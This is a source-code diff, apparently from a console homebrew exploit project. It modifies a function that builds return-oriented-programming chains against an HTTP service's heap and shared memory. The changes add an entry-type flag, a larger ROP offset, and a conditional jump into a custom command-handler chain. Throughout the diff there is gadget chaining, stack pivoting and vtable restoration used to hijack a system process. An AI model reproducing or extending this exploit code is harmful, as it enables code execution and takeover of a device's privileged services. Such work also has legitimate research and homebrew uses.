@@ -851,12 +851,13 @@ Result setuphaxx_httpheap_sharedmem(targeturlctx *first_targeturlctx)
 	u32 *ropchain0, ropvaddr0;
 	u32 *ropchain1, ropvaddr1;
 	u32 *ropchain2, ropvaddr2;
+	u32 *ropchain3, ropvaddr3;
 
 	u32 *ropchain_block0, ropvaddr_block0;
 	u32 *ropchain_block1, ropvaddr_block1;
 
 	u32 ropallocsize = 0x4000;
-	u32 ropoffset = 0x500;
+	u32 ropoffset = 0x800;
 	u32 bakropoff = ropoffset + ropallocsize;
 	u32 roplaunch_bakaddr;
 	u32 roplaunch_baksize;
@@ -881,6 +882,7 @@ Result setuphaxx_httpheap_sharedmem(targeturlctx *first_targeturlctx)
 	targeturl_caps tmpcaps;
 
 	u32 curent = ropheap+0x3c;
+	u32 ropentry_type = ropheap+0x44;
 
 	if(first_targeturlctx==NULL)
 	{
@@ -928,6 +930,7 @@ Result setuphaxx_httpheap_sharedmem(targeturlctx *first_targeturlctx)
 
 	ropgen_strr0r1(&ropchain, &ropvaddr, ropheap+0x0, 1);//Due to the "mov r0, r4" done previously, r0 contains the cmdbuf ptr at this point. Save that ptr @ ropheap+0x0.
 	ropgen_copyu32(&ropchain, &ropvaddr, __httpmainthread_cmdhandler_stackframe + 24 + 12, ropheap+0x4, 0x3);//Copy the _this value for httpc_cmdhandler, from the saved r7 in the httpc_cmdhandler stackframe to ropheap+0x4.
+	//For whatever reason writing ropentry_type here causes some sort of corruption issues with the main ROP below.
 
 	//Copy the backup ROP-chain to the main offset then pivot to the main ROP-chain.
 	ropgen_memcpy(&ropchain, &ropvaddr, ropvmem_base+ropoffset, ropvmem_base+bakropoff, ropallocsize);
@@ -940,6 +943,7 @@ Result setuphaxx_httpheap_sharedmem(targeturlctx *first_targeturlctx)
 	ropgen_ldrr0r1(&ropchain, &ropvaddr, 0x08000004, 1);//Load the zero from 0x08000004 into r0, since the ROP_PUSHR42IPLR_CMPR0_RETURN gadget requires it.
 	ropgen_blxr3(&ropchain, &ropvaddr, ROP_PUSHR42IPLR_CMPR0_RETURN, 1);//Save r4-ip and lr on stack.
 	ropgen_copyu32(&ropchain, &ropvaddr, ropheap+0x8, ROP_PUSHR42IPLR_CMPR0_RETURN_STATEPTR+4, 0x3);
+	ropgen_writeu32(&ropchain, &ropvaddr, 0x1, ropentry_type, 1);//Write 0x1 to ropentry_type.
 
 	//Copy the backup ROP-chain to the main offset then pivot to the main ROP-chain.
 	ropgen_memcpy(&ropchain, &ropvaddr, ropvmem_base+ropoffset, ropvmem_base+bakropoff, ropallocsize);
@@ -981,6 +985,13 @@ Result setuphaxx_httpheap_sharedmem(targeturlctx *first_targeturlctx)
 	ropgen_movr1r0(&ropchain, &ropvaddr);
 	ropgen_ldrr0r1(&ropchain, &ropvaddr, 0, 0);//r0 = cmdbuf[0](cmdhdr).
 	ropgen_strr0r1(&ropchain, &ropvaddr, ropheap+0x14, 1);//Write the u32 cmdhdr to ropheap+0x14.
+
+	//Continue running the below ROP when the value at ropentry_type is 0x0, otherwise jump to the ROP for the custom cmdhandler.
+	ropgen_ldrr0r1(&ropchain, &ropvaddr, ropentry_type, 1);
+	ropgen_popr1(&ropchain, &ropvaddr, 0x0);
+	ropchain3 = ropchain;
+	ropvaddr3 = ropvaddr;
+	ropgen_checkcond_eqcontinue_nejump(&ropchain, &ropvaddr, 0);
 
 	ropgen_ldrr0r1(&ropchain, &ropvaddr, ropheap+0x8, 1);//Set the *(_this+16) vtableptr to the original one for main-serv-sessions.
 	ropgen_add_r0ip(&ropchain, &ropvaddr, 0xfffffffc);
@@ -1245,6 +1256,13 @@ Result setuphaxx_httpheap_sharedmem(targeturlctx *first_targeturlctx)
 	ropgen_addwords(&ropchain, &ropvaddr, 0, 6 + 7);//"add sp, sp, #24" "pop {r4..sl, pc}"
 
 	ropgen_ret2cmdhandler(&ropchain, &ropvaddr);
+
+	//Setup the actual pivot for the custom cmdhandler, the actual ROP-chain follows this.
+	ropgen_checkcond_eqcontinue_nejump(&ropchain3, &ropvaddr3, ropvaddr);
+
+	ropgen_writeu32(&ropchain, &ropvaddr, 0x0, ropentry_type, 1);//Write 0x0 to ropentry_type.
+
+	ropgen_addword(&ropchain, &ropvaddr, 0x55555554);
 
 	if(ropvaddr-ropvmem_base > bakropoff)
 	{
